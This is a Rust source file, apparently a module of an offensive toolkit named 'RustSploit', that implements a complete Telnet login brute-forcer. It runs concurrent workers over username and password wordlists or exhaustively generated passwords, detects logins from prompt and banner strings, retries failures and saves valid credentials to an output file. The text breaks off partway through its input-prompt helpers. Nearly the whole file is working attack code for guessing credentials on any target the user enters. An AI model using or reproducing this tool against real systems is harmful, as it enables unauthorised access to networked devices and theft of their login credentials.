use anyhow::{anyhow, Context, Result};
use async_stream::stream;
use colored::*;
use futures::{Stream, StreamExt};
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::collections::HashSet;
use std::net::ToSocketAddrs;
use std::path::Path;
use std::sync::{
    atomic::{AtomicBool, AtomicU64, Ordering},
    Arc,
};
use std::time::{Duration, Instant};
use tokio::fs::{File, OpenOptions};
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;
use tokio::sync::{mpsc, Mutex, Semaphore};
use tokio::time::{sleep, timeout};
use futures::pin_mut;

/// Entry point (async)
pub async fn run(target: &str) -> Result<()> {
    println!("\n{}", "=== Telnet Bruteforce Module (RustSploit) ===".bold().cyan());
    println!();

    let target = target.trim().to_string();
    
    // Ask if user wants to use config file
    let use_config = prompt_yes_no("Do you have a configuration file? (y/n): ", false);
    
    let config = if use_config {
        println!();
        print_config_format();
        println!();
        
        let config_path = prompt_wordlist("Path to configuration file: ")?;
        
        println!("[*] Loading configuration from '{}'...", config_path);
        match load_and_validate_config(&config_path, &target).await {
            Ok(cfg) => {
                println!("{}", "[+] Configuration loaded and validated successfully!".green().bold());
                cfg
            }
            Err(e) => {
                eprintln!("{}", format!("[!] Configuration validation failed:").red().bold());
                eprintln!("{}", format!("    {}", e).yellow());
                eprintln!();
                eprintln!("{}", "Please fix the configuration file or use interactive mode.".yellow());
                return Err(e);
            }
        }
    } else {
        // Interactive configuration
        println!();
        println!("{}", "[Interactive Configuration Mode]".bold().green());
        println!();

        // Network configuration
        let port = prompt_port(23);
        let threads = prompt_threads(8);
        let delay_ms = prompt_delay(100);
        let connection_timeout = prompt_timeout("Connection timeout (seconds, default 3): ", 3);
        let read_timeout = prompt_timeout("Read timeout (seconds, default 1): ", 1);
        
        // Wordlist configuration
        let username_wordlist = prompt_wordlist("Username wordlist file: ")?;
        let raw_bruteforce = prompt_yes_no("Enable raw brute-force password generation? (y/n): ", false);
        
        let password_wordlist = if raw_bruteforce {
            prompt_optional_wordlist("Password wordlist file (leave blank to skip): ")?
        } else {
            Some(prompt_wordlist("Password wordlist file: ")?)
        };
        
        let (raw_charset, raw_min_length, raw_max_length) = if raw_bruteforce {
            let charset = prompt_charset(
                "Raw brute-force character set (default: lowercase): ",
                "abcdefghijklmnopqrstuvwxyz",
            );
            let min_len = prompt_min_length(1, 1, 8);
            let max_len = prompt_max_length(4, min_len, 8);
            (charset, min_len, max_len)
        } else {
            (String::new(), 0, 0)
        };

        // Attack strategy
        let full_combo = prompt_yes_no("Try every username with every password? (y/n): ", false);
        let stop_on_success = prompt_yes_no("Stop on first valid login? (y/n): ", false);
        
        // Output configuration
        let output_file = prompt_required("Output file for results: ");
        let append_mode = if tokio::fs::metadata(&output_file).await.is_ok() {
            prompt_yes_no(&format!("File '{}' exists. Append to it? (y/n): ", output_file), true)
        } else {
            false
        };
        
        // Advanced options
        let verbose = prompt_yes_no("Verbose mode (show all attempts)? (y/n): ", false);
        let pre_validate = prompt_yes_no("Pre-validate target is Telnet service? (y/n): ", true);
        let retry_on_error = prompt_yes_no("Retry failed connections? (y/n): ", true);
        let max_retries = if retry_on_error {
            prompt_retries(2)
        } else {
            0
        };

        // Custom login prompts (optional advanced feature)
        let use_custom_prompts = prompt_yes_no("Use custom login/password prompts? (y/n): ", false);
        let (login_prompts, password_prompts) = if use_custom_prompts {
            let login = prompt_list("Login prompts (comma-separated, e.g., 'login:,username:,user:'): ");
            let password = prompt_list("Password prompts (comma-separated, e.g., 'password:,pass:'): ");
            (login, password)
        } else {
            (
                vec!["login:".to_string(), "username:".to_string(), "user:".to_string()],
                vec!["password:".to_string()],
            )
        };

        let (success_indicators, failure_indicators) = if use_custom_prompts {
            let success = prompt_list("Success indicators (comma-separated, e.g., '$,#,welcome'): ");
            let failure = prompt_list("Failure indicators (comma-separated, e.g., 'incorrect,failed,denied'): ");
            (success, failure)
        } else {
            (
                vec!["last login".to_string(), "welcome".to_string(), "$ ".to_string(), "# ".to_string()],
                vec!["incorrect".to_string(), "failed".to_string(), "denied".to_string(), "invalid".to_string()],
            )
        };

        TelnetBruteforceConfig {
            target: target.clone(),
            port,
            username_wordlist,
            password_wordlist,
            threads,
            delay_ms,
            connection_timeout,
            read_timeout,
            stop_on_success,
            verbose,
            full_combo,
            raw_bruteforce,
            raw_charset,
            raw_min_length,
            raw_max_length,
            output_file,
            append_mode,
            pre_validate,
            retry_on_error,
            max_retries,
            login_prompts,
            password_prompts,
            success_indicators,
            failure_indicators,
        }
    };

    // Display configuration summary
    print_config_summary(&config);

    if !prompt_yes_no("\nProceed with this configuration? (y/n): ", true) {
        println!("[*] Aborted by user.");
        return Ok(());
    }

    // Offer to save config if in interactive mode
    if !use_config {
        if prompt_yes_no("\nSave this configuration for future use? (y/n): ", false) {
            let save_path = prompt_required("Configuration file path: ");
            if let Err(e) = save_config(&config, &save_path).await {
                eprintln!("[!] Failed to save config: {}", e);
            } else {
                println!("[+] Configuration saved to '{}'", save_path);
            }
        }
    }

    println!();
    println!("{}", "[Starting Attack]".bold().yellow());
    println!();

    run_telnet_bruteforce(config).await
}

#[derive(Clone, Serialize, Deserialize)]
struct TelnetBruteforceConfig {
    #[serde(skip)]
    target: String,
    port: u16,
    username_wordlist: String,
    password_wordlist: Option<String>,
    threads: usize,
    delay_ms: u64,
    connection_timeout: u64,
    read_timeout: u64,
    stop_on_success: bool,
    verbose: bool,
    full_combo: bool,
    raw_bruteforce: bool,
    raw_charset: String,
    raw_min_length: usize,
    raw_max_length: usize,
    output_file: String,
    append_mode: bool,
    pre_validate: bool,
    retry_on_error: bool,
    max_retries: usize,
    login_prompts: Vec<String>,
    password_prompts: Vec<String>,
    success_indicators: Vec<String>,
    failure_indicators: Vec<String>,
}

struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    retried_attempts: AtomicU64,
    start_time: Instant,
}

impl Statistics {
    fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            retried_attempts: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }

    fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    fn record_retry(&self) {
        self.retried_attempts.fetch_add(1, Ordering::Relaxed);
    }

    fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let retries = self.retried_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {} retry | {:.1}/s    ",
            "[Progress]".cyan(),
            total.to_string().bold(),
            success.to_string().green(),
            failed,
            errors.to_string().red(),
            retries,
            rate
        );
        let _ = std::io::Write::flush(&mut std::io::stdout());
    }

    fn print_final(&self) {
        println!(); // New line after progress
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let retries = self.retried_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        println!("\n{}", "[Final Statistics]".bold().cyan());
        println!("  Total attempts:  {}", total.to_string().bold());
        println!("  Successful:      {}", success.to_string().green().bold());
        println!("  Failed:          {}", failed);
        println!("  Errors:          {}", errors.to_string().yellow());
        println!("  Retries:         {}", retries);
        println!("  Time elapsed:    {:.2}s", elapsed);
        println!("  Average rate:    {:.2} attempts/sec", rate);
        if success > 0 {
            let success_rate = (success as f64 / total as f64) * 100.0;
            println!("  Success rate:    {:.2}%", success_rate);
        }
    }
}

fn print_config_format() {
    println!("{}", "=== Configuration File Format (JSON) ===".bold().cyan());
    println!("{}", r#"
{
  "port": 23,
  "username_wordlist": "/path/to/usernames.txt",
  "password_wordlist": "/path/to/passwords.txt",
  "threads": 8,
  "delay_ms": 100,
  "connection_timeout": 3,
  "read_timeout": 1,
  "stop_on_success": false,
  "verbose": false,
  "full_combo": false,
  "raw_bruteforce": false,
  "raw_charset": "abcdefghijklmnopqrstuvwxyz",
  "raw_min_length": 1,
  "raw_max_length": 4,
  "output_file": "telnet_results.txt",
  "append_mode": false,
  "pre_validate": true,
  "retry_on_error": true,
  "max_retries": 2,
  "login_prompts": ["login:", "username:", "user:"],
  "password_prompts": ["password:"],
  "success_indicators": ["last login", "welcome"],
  "failure_indicators": ["incorrect", "failed", "denied", "invalid"]
}
"#.bright_black());
    println!("{}", "========================================".cyan());
}

async fn load_and_validate_config(path: &str, target: &str) -> Result<TelnetBruteforceConfig> {
    // Read file
    let content = tokio::fs::read_to_string(path)
        .await
        .context("Failed to read configuration file")?;
    
    // Parse JSON
    let mut config: TelnetBruteforceConfig = serde_json::from_str(&content)
        .context("Failed to parse JSON configuration. Please check syntax.")?;
    
    config.target = target.to_string();
    
    // Validate all fields
    let mut errors = Vec::new();
    
    // Validate port
    if config.port == 0 {
        errors.push("Port must be greater than 0".to_string());
    }
    
    // Validate threads
    if config.threads == 0 {
        errors.push("Threads must be at least 1".to_string());
    }
    if config.threads > 256 {
        errors.push("Threads cannot exceed 256".to_string());
    }
    
    // Validate timeouts
    if config.connection_timeout == 0 || config.connection_timeout > 60 {
        errors.push("Connection timeout must be between 1-60 seconds".to_string());
    }
    if config.read_timeout == 0 || config.read_timeout > 60 {
        errors.push("Read timeout must be between 1-60 seconds".to_string());
    }
    
    // Validate delay
    if config.delay_ms > 10000 {
        errors.push("Delay cannot exceed 10000ms".to_string());
    }
    
    // Validate retries
    if config.max_retries > 10 {
        errors.push("Max retries cannot exceed 10".to_string());
    }
    
    // Validate username wordlist
    if config.username_wordlist.is_empty() {
        errors.push("Username wordlist path is required".to_string());
    } else {
        match tokio::fs::metadata(&config.username_wordlist).await {
            Ok(meta) if meta.is_file() => {
                let count = count_nonempty_lines(&config.username_wordlist).await?;
                if count == 0 {
                    errors.push(format!("Username wordlist '{}' is empty", config.username_wordlist));
                }
            }
            _ => errors.push(format!("Username wordlist '{}' does not exist or is not a file", config.username_wordlist)),
        }
    }
    
    // Validate password wordlist
    if let Some(ref pwd_path) = config.password_wordlist {
        if !pwd_path.is_empty() {
            match tokio::fs::metadata(pwd_path).await {
                Ok(meta) if meta.is_file() => {
                    let count = count_nonempty_lines(pwd_path).await?;
                    if count == 0 && !config.raw_bruteforce {
                        errors.push(format!("Password wordlist '{}' is empty and raw bruteforce is disabled", pwd_path));
                    }
                }
                _ => errors.push(format!("Password wordlist '{}' does not exist or is not a file", pwd_path)),
            }
        }
    } else if !config.raw_bruteforce {
        errors.push("Password wordlist is required when raw bruteforce is disabled".to_string());
    }
    
    // Validate raw bruteforce settings
    if config.raw_bruteforce {
        if config.raw_charset.is_empty() {
            errors.push("Raw bruteforce charset cannot be empty when raw bruteforce is enabled".to_string());
        }
        if config.raw_min_length == 0 {
            errors.push("Raw bruteforce min length must be at least 1".to_string());
        }
        if config.raw_max_length == 0 {
            errors.push("Raw bruteforce max length must be at least 1".to_string());
        }
        if config.raw_min_length > config.raw_max_length {
            errors.push("Raw bruteforce min length cannot exceed max length".to_string());
        }
        if config.raw_max_length > 8 {
            errors.push("Raw bruteforce max length cannot exceed 8 (performance limit)".to_string());
        }
    }
    
    // Validate output file
    if config.output_file.is_empty() {
        errors.push("Output file path is required".to_string());
    }
    
    // Validate prompts
    if config.login_prompts.is_empty() {
        errors.push("At least one login prompt is required".to_string());
    }
    if config.password_prompts.is_empty() {
        errors.push("At least one password prompt is required".to_string());
    }
    if config.success_indicators.is_empty() {
        errors.push("At least one success indicator is required".to_string());
    }
    if config.failure_indicators.is_empty() {
        errors.push("At least one failure indicator is required".to_string());
    }
    
    // Return all errors if any
    if !errors.is_empty() {
        let error_msg = errors.join("\n    - ");
        return Err(anyhow!("Configuration validation errors:\n    - {}", error_msg));
    }
    
    Ok(config)
}

async fn save_config(config: &TelnetBruteforceConfig, path: &str) -> Result<()> {
    let json = serde_json::to_string_pretty(config)
        .context("Failed to serialize configuration")?;
    
    tokio::fs::write(path, json)
        .await
        .context("Failed to write configuration file")?;
    
    Ok(())
}

fn print_config_summary(config: &TelnetBruteforceConfig) {
    println!("\n{}", "=== Configuration Summary ===".bold().cyan());
    println!("  Target:              {}:{}", config.target, config.port);
    println!("  Username wordlist:   {}", config.username_wordlist);
    if let Some(ref pwd) = config.password_wordlist {
        println!("  Password wordlist:   {}", pwd);
    }
    if config.raw_bruteforce {
        println!("  Raw bruteforce:      Enabled ({}-{} chars, {} charset)", 
                 config.raw_min_length, config.raw_max_length, config.raw_charset.chars().count());
    }
    println!("  Threads:             {}", config.threads);
    println!("  Delay:               {}ms", config.delay_ms);
    println!("  Connection timeout:  {}s", config.connection_timeout);
    println!("  Read timeout:        {}s", config.read_timeout);
    println!("  Full combo mode:     {}", if config.full_combo { "Yes" } else { "No" });
    println!("  Stop on success:     {}", if config.stop_on_success { "Yes" } else { "No" });
    println!("  Output file:         {} ({})", 
             config.output_file, 
             if config.append_mode { "append" } else { "overwrite" });
    println!("  Pre-validate:        {}", if config.pre_validate { "Yes" } else { "No" });
    println!("  Retry on error:      {}", if config.retry_on_error { 
        format!("Yes (max {} retries)", config.max_retries) 
    } else { 
        "No".to_string() 
    });
    println!("  Verbose:             {}", if config.verbose { "Yes" } else { "No" });
    println!("{}", "=============================".cyan());
}

async fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
    let addr = normalize_target(&config.target, config.port).context("Invalid target address")?;
    let socket_addr = addr
        .to_socket_addrs()?
        .next()
        .context("Unable to resolve target address")?;

    println!("[*] Target resolved to: {}", socket_addr);

    // Pre-validate target if requested
    if config.pre_validate {
        println!("[*] Validating target is Telnet service...");
        match validate_telnet_target(&addr, &config).await {
            Ok(_) => println!("{}", "[+] Target validation successful".green()),
            Err(e) => {
                eprintln!("{}", format!("[!] Target validation failed: {}", e).yellow());
                if !prompt_yes_no("Continue anyway? (y/n): ", false) {
                    return Err(anyhow!("Target validation failed"));
                }
            }
        }
    }

    // Count wordlist lines
    let username_count = count_nonempty_lines(&config.username_wordlist).await?;
    let password_count = if let Some(ref pwd_path) = config.password_wordlist {
        count_nonempty_lines(pwd_path).await?
    } else {
        0
    };

    println!("[*] Loaded {} username(s)", username_count);
    if password_count > 0 {
        println!("[*] Loaded {} password(s)", password_count);
    }

    // Estimate total attempts
    let mut estimated_total = if config.full_combo {
        username_count * password_count
    } else if username_count == 1 {
        password_count
    } else if password_count == 1 {
        username_count
    } else {
        password_count
    };

    if config.raw_bruteforce {
        let charset_len = config.raw_charset.chars().count();
        let mut raw_total = 0u64;
        for len in config.raw_min_length..=config.raw_max_length {
            raw_total += charset_len.pow(len as u32) as u64;
        }
        println!("[*] Raw brute-force will generate ~{} passwords", raw_total);
        
        let users_for_raw = if config.full_combo || username_count == 1 {
            username_count as u64
        } else {
            1
        };
        estimated_total += (raw_total * users_for_raw) as usize;
    }

    println!("[*] Estimated total attempts: {}", estimated_total);
    println!();

    // Initialize output file
    let output_file = Arc::new(config.output_file.clone());
    if !config.append_mode {
        let mut f = File::create(output_file.as_ref()).await?;
        f.write_all(format!("# Telnet Bruteforce Results - {}\n", chrono::Local::now()).as_bytes()).await?;
        f.write_all(format!("# Target: {}:{}\n", config.target, config.port).as_bytes()).await?;
        f.write_all(b"# Format: username:password\n\n").await?;
    }

    let found_creds = Arc::new(Mutex::new(HashSet::new()));
    let stop_flag = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());

    let (tx, rx) = mpsc::channel::<(String, String)>(config.threads.saturating_mul(4).max(8));

    // Spawn producers
    if password_count > 0 {
        let password_path = config.password_wordlist.clone().unwrap();
        let username_path = config.username_wordlist.clone();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();
        tokio::spawn(async move {
            if let Err(e) = enqueue_wordlist_combos(
                tx_clone,
                &username_path,
                &password_path,
                full_combo,
                stop_clone,
                username_count,
                password_count,
            )
            .await
            {
                eprintln!("[!] Wordlist producer error: {}", e);
            }
        });
    }

    if config.raw_bruteforce {
        let charset: Vec<char> = config.raw_charset.chars().collect();
        let min_len = config.raw_min_length;
        let max_len = config.raw_max_length;
        let username_path = config.username_wordlist.clone();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();
        tokio::spawn(async move {
            let pwd_stream = raw_password_stream(charset, min_len, max_len);
            pin_mut!(pwd_stream);
            while let Some(pwd) = pwd_stream.next().await {
                if stop_clone.load(Ordering::Relaxed) {
                    break;
                }
                if let Err(e) = send_password_to_usernames(
                    &username_path,
                    &pwd,
                    &tx_clone,
                    &stop_clone,
                    full_combo,
                    username_count,
                )
                .await
                {
                    eprintln!("[!] Raw producer error: {}", e);
                    break;
                }
            }
        });
    }

    drop(tx);

    // Spawn workers
    let semaphore = Arc::new(Semaphore::new(config.threads));
    let rx = Arc::new(Mutex::new(rx));
    let mut worker_handles = Vec::new();

    for worker_id in 0..config.threads {
        let rx_clone = rx.clone();
        let addr_clone = addr.clone();
        let stop_clone = stop_flag.clone();
        let creds_clone = found_creds.clone();
        let output_clone = output_file.clone();
        let cfg = config.clone();
        let stats_clone = stats.clone();
        let sem_clone = semaphore.clone();

        let h = tokio::spawn(async move {
            loop {
                let pair = {
                    let mut guard = rx_clone.lock().await;
                    guard.recv().await
                };
                
                let Some((user, pass)) = pair else {
                    break;
                };

                if stop_clone.load(Ordering::Relaxed) {
                    break;
                }

                let _permit = sem_clone.acquire().await.unwrap();
                
                if cfg.verbose {
                    println!(
                        "{} [Worker {}] Trying {}:{}",
                        "[*]".bright_blue(),
                        worker_id,
                        user,
                        &pass
                    );
                }

                let mut attempt_result = try_telnet_login(&addr_clone, &user, &pass, &cfg).await;
                let mut retry_count = 0;
                
                while cfg.retry_on_error && retry_count < cfg.max_retries {
                    if let Err(_) = attempt_result {
                        retry_count += 1;
                        stats_clone.record_retry();
                        sleep(Duration::from_millis(cfg.delay_ms * 2)).await;
                        attempt_result = try_telnet_login(&addr_clone, &user, &pass, &cfg).await;
                    } else {
                        break;
                    }
                }

                match attempt_result {
                    Ok(true) => {
                        stats_clone.record_attempt(true, false);
                        
                        let mut creds = creds_clone.lock().await;
                        if creds.insert((user.clone(), pass.clone())) {
                            drop(creds);
                            
                            println!(
                                "\n{}",
                                format!("[+] VALID CREDENTIALS: {}:{}", user, pass).green().bold()
                            );
                            
                            if let Err(e) = append_result(&output_clone, &user, &pass).await {
                                eprintln!("[!] Failed to write result: {}", e);
                            }
                            
                            if cfg.stop_on_success {
                                stop_clone.store(true, Ordering::Relaxed);
                                break;
                            }
                        }
                    }
                    Ok(false) => {
                        stats_clone.record_attempt(false, false);
                        if cfg.verbose {
                            println!("{} Failed: {}:{}", "[-]".red(), user, pass);
                        }
                    }
                    Err(e) => {
                        stats_clone.record_attempt(false, true);
                        if cfg.verbose {
                            eprintln!("{} Error ({}): {}:{}", "[!]".yellow(), e, user, pass);
                        }
                    }
                }

                if cfg.delay_ms > 0 {
                    sleep(Duration::from_millis(cfg.delay_ms)).await;
                }
            }
        });
        worker_handles.push(h);
    }

    // Progress reporting
    let stats_clone = stats.clone();
    let stop_clone = stop_flag.clone();
    let progress_handle = tokio::spawn(async move {
        while !stop_clone.load(Ordering::Relaxed) {
            sleep(Duration::from_secs(2)).await;
            stats_clone.print_progress();
        }
    });

    for h in worker_handles {
        let _ = h.await;
    }

    stop_flag.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    stats.print_final();

    // Final report
    let found = found_creds.lock().await;
    println!();
    if found.is_empty() {
        println!("{}", "[-] No valid credentials found.".yellow());
    } else {
        println!("{}", format!("[+] Found {} unique credential(s):", found.len()).green().bold());
        let mut sorted: Vec<_> = found.iter().collect();
        sorted.sort();
        for (u, p) in sorted.iter() {
            println!("  {}  {}:{}", "✓".green(), u, p);
        }
        println!("\n[*] All results saved to: {}", output_file.as_ref());
    }

    Ok(())
}

async fn validate_telnet_target(addr: &str, config: &TelnetBruteforceConfig) -> Result<()> {
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Could not resolve"))?;
    let connect_fut = TcpStream::connect(socket);
    let mut stream = timeout(Duration::from_secs(config.connection_timeout), connect_fut)
        .await
        .context("Connection timed out")?
        .context("Connect failed")?;

    let mut buf = vec![0u8; 512];
    match timeout(Duration::from_secs(config.read_timeout), stream.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => {
            let response = String::from_utf8_lossy(&buf[..n]).to_lowercase();
            if response.contains("login") || response.contains("username") || 
               response.contains("telnet") || response.contains("password") {
                Ok(())
            } else {
                Err(anyhow!("No telnet prompts detected"))
            }
        }
        _ => Err(anyhow!("No response from target")),
    }
}

async fn try_telnet_login(
    addr: &str,
    username: &str,
    password: &str,
    config: &TelnetBruteforceConfig,
) -> Result<bool> {
    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;

    let connect_fut = TcpStream::connect(socket);
    let stream = timeout(Duration::from_secs(config.connection_timeout), connect_fut)
        .await
        .context("Connection timeout")?
        .context("Connect failed")?;
    
    let (mut reader, mut writer) = stream.into_split();
    let mut buf = vec![0u8; 2048];

    let mut login_sent = false;
    let mut pass_sent = false;
    let mut response_after_pass = String::new();

    for cycle in 0..15 {
        let read_result = timeout(
            Duration::from_millis((config.read_timeout * 1000) as u64),
            reader.read(&mut buf)
        ).await;
        
        let n = match read_result {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => n,
            Ok(Err(_)) | Err(_) => {
                if pass_sent && cycle >= 3 {
                    break;
                }
                continue;
            }
        };

        let output = String::from_utf8_lossy(&buf[..n]);
        let lower = output.to_lowercase();

        if pass_sent {
            response_after_pass.push_str(&output);
        }

        if !login_sent {
            for prompt in &config.login_prompts {
                if lower.contains(&prompt.to_lowercase()) {
                    let _ = timeout(
                        Duration::from_millis(500),
                        writer.write_all(format!("{}\r\n", username).as_bytes())
                    ).await;
                    login_sent = true;
                    break;
                }
            }
            if login_sent {
                continue;
            }
        }

        if login_sent && !pass_sent {
            for prompt in &config.password_prompts {
                if lower.contains(&prompt.to_lowercase()) {
                    let _ = timeout(
                        Duration::from_millis(500),
                        writer.write_all(format!("{}\r\n", password).as_bytes())
                    ).await;
                    pass_sent = true;
                    break;
                }
            }
            if pass_sent {
                continue;
            }
        }

        if pass_sent {
            for indicator in &config.failure_indicators {
                if lower.contains(&indicator.to_lowercase()) {
                    return Ok(false);
                }
            }

            for indicator in &config.success_indicators {
                if lower.contains(&indicator.to_lowercase()) {
                    return Ok(true);
                }
            }
        }
    }

    if pass_sent {
        let final_lower = response_after_pass.to_lowercase();
        
        for indicator in &config.failure_indicators {
            if final_lower.contains(&indicator.to_lowercase()) {
                return Ok(false);
            }
        }
        
        for indicator in &config.success_indicators {
            if final_lower.contains(&indicator.to_lowercase()) {
                return Ok(true);
            }
        }
        
        if final_lower.len() > 50 {
            return Ok(true);
        }
    }

    Ok(false)
}

async fn append_result(output_file: &str, username: &str, password: &str) -> Result<()> {
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(output_file)
        .await?;
    
    file.write_all(format!("{}:{}\n", username, password).as_bytes()).await?;
    file.flush().await?;
    Ok(())
}

fn raw_password_stream(charset: Vec<char>, min_len: usize, max_len: usize) -> impl Stream<Item = String> {
    stream! {
        if charset.is_empty() || max_len == 0 {
            return;
        }
        
        let base = charset.len();
        
        for len in min_len..=max_len {
            let mut indices = vec![0usize; len];
            
            loop {
                let pwd: String = indices.iter().map(|&i| charset[i]).collect();
                yield pwd;

                let mut carry = true;
                for i in (0..len).rev() {
                    if carry {
                        indices[i] += 1;
                        if indices[i] < base {
                            carry = false;
                        } else {
                            indices[i] = 0;
                        }
                    }
                }
                
                if carry {
                    break;
                }
            }
        }
    }
}

async fn send_password_to_usernames(
    username_path: &str,
    password: &str,
    tx: &mpsc::Sender<(String, String)>,
    stop_flag: &AtomicBool,
    full_combo: bool,
    username_count: usize,
) -> Result<()> {
    if stop_flag.load(Ordering::Relaxed) {
        return Ok(());
    }

    if full_combo || username_count == 1 {
        let f = File::open(username_path).await?;
        let mut reader = BufReader::new(f).lines();
        while let Some(line) = reader.next_line().await? {
            if stop_flag.load(Ordering::Relaxed) {
                break;
            }
            let u = line.trim();
            if u.is_empty() {
                continue;
            }
            tx.send((u.to_string(), password.to_string()))
                .await
                .map_err(|_| anyhow!("Receiver dropped"))?;
        }
    } else {
        if let Some(first_user) = get_first_nonempty_line(username_path).await? {
            tx.send((first_user, password.to_string()))
                .await
                .map_err(|_| anyhow!("Receiver dropped"))?;
        }
    }
    Ok(())
}

async fn enqueue_wordlist_combos(
    tx: mpsc::Sender<(String, String)>,
    username_path: &str,
    password_path: &str,
    full_combo: bool,
    stop_flag: Arc<AtomicBool>,
    username_count: usize,
    password_count: usize,
) -> Result<()> {
    if password_count == 0 {
        return Ok(());
    }

    if full_combo {
        let passwords = load_wordlist(password_path).await?;
        let ufile = File::open(username_path).await?;
        let mut ureader = BufReader::new(ufile).lines();
        
        while let Some(uline) = ureader.next_line().await? {
            if stop_flag.load(Ordering::Relaxed) {
                break;
            }
            let u = uline.trim();
            if u.is_empty() {
                continue;
            }

            for p in &passwords {
                if stop_flag.load(Ordering::Relaxed) {
                    break;
                }
                tx.send((u.to_string(), p.clone()))
                    .await
                    .map_err(|_| anyhow!("Receiver dropped"))?;
            }
        }
    } else if username_count == 1 {
        let first_user = get_first_nonempty_line(username_path)
            .await?
            .ok_or_else(|| anyhow!("No username found"))?;
        let pfile = File::open(password_path).await?;
        let mut preader = BufReader::new(pfile).lines();
        
        while let Some(pline) = preader.next_line().await? {
            if stop_flag.load(Ordering::Relaxed) {
                break;
            }
            let p = pline.trim();
            if p.is_empty() {
                continue;
            }
            tx.send((first_user.clone(), p.to_string()))
                .await
                .map_err(|_| anyhow!("Receiver dropped"))?;
        }
    } else if password_count == 1 {
        let first_pass = get_first_nonempty_line(password_path)
            .await?
            .ok_or_else(|| anyhow!("No password found"))?;
        let ufile = File::open(username_path).await?;
        let mut ureader = BufReader::new(ufile).lines();
        
        while let Some(uline) = ureader.next_line().await? {
            if stop_flag.load(Ordering::Relaxed) {
                break;
            }
            let u = uline.trim();
            if u.is_empty() {
                continue;
            }
            tx.send((u.to_string(), first_pass.clone()))
                .await
                .map_err(|_| anyhow!("Receiver dropped"))?;
        }
    } else {
        let first_user = get_first_nonempty_line(username_path)
            .await?
            .ok_or_else(|| anyhow!("No username found"))?;
        let pfile = File::open(password_path).await?;
        let mut preader = BufReader::new(pfile).lines();
        
        while let Some(pline) = preader.next_line().await? {
            if stop_flag.load(Ordering::Relaxed) {
                break;
            }
            let p = pline.trim();
            if p.is_empty() {
                continue;
            }
            tx.send((first_user.clone(), p.to_string()))
                .await
                .map_err(|_| anyhow!("Receiver dropped"))?;
        }
    }

    Ok(())
}

async fn load_wordlist(path: &str) -> Result<Vec<String>> {
    let f = File::open(path).await?;
    let mut reader = BufReader::new(f).lines();
    let mut words = Vec::new();
    
    while let Some(line) = reader.next_line().await? {
        let trimmed = line.trim();
        if !trimmed.is_empty() {
            words.push(trimmed.to_string());
        }
    }
    
    Ok(words)
}

async fn get_first_nonempty_line(path: &str) -> Result<Option<String>> {
    let f = File::open(path).await?;
    let mut reader = BufReader::new(f).lines();
    while let Some(line) = reader.next_line().await? {
        let t = line.trim();
        if !t.is_empty() {
            return Ok(Some(t.to_string()));
        }
    }
    Ok(None)
}

async fn count_nonempty_lines(path: &str) -> Result<usize> {
    let f = File::open(path).await?;
    let mut reader = BufReader::new(f).lines();
    let mut count = 0usize;
    while let Some(line) = reader.next_line().await? {
        if !line.trim().is_empty() {
            count += 1;
        }
    }
    Ok(count)
}

// ============================================================
// PROMPT FUNCTIONS
// ============================================================

fn prompt(msg: &str) -> String {
    use std::io::Write;
    print!("{}", msg);
    let _ = std::io::stdout().flush();
    let mut buf = String::new();
    match std::io::stdin().read_line(&mut buf) {
        Ok(_) => buf.trim().to_string(),
        Err(_) => String::new(),
    }
}

fn prompt_required(msg: &str) -> String {
    loop {
        let input = prompt(msg);
        if !input.trim().is_empty() {
            return input.trim().to_string();
        }
        println!("[!] This field is required.");
    }
}

fn prompt_port(default: u16) -> u16 {
    loop {
        let input = prompt(&format!("Port (default {}): ", default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<u16>() {
            Ok(port) if port > 0 => return port,
            _ => println!("[!] Invalid port value."),
        }
    }
}

fn prompt_delay(default: u64) -> u64 {
    loop {
        let input = prompt(&format!("Delay between attempts in ms (default {}): ", default));
        if input.is_empty() {
            return default;
        }
        match input.parse::<u64>() {
            Ok(val) if val <= 10000 => return val,
            _ => println!("[!] Invalid delay (max 10000ms)."),
        }
    }
}

fn prompt_timeout(msg: &str, default: u64) -> u64 {
    loop {
        let input = prompt(msg);
        if input.is_empty() {
            return default;
        }
        match input.parse::<u64>() {
            Ok(val) if val > 0 && val <= 60 => return val,
            _ => println!("[!] Invalid timeout (1-60 seconds)."),
